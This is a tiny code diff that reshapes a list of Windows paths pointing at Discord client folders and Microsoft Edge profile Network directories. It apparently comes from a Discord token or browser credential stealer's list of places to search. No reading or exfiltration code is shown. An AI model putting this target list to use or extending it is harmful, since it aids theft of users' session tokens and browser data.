@@ -1,4 +1,4 @@
-paths = [
+[
     appdata + '\\discord\\',
     appdata + '\\discordcanary\\',
     appdata + '\\discordptb\\',
@@ -60,4 +60,4 @@ paths = [
     localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\',
     localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\',
     localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\'
-];
+]
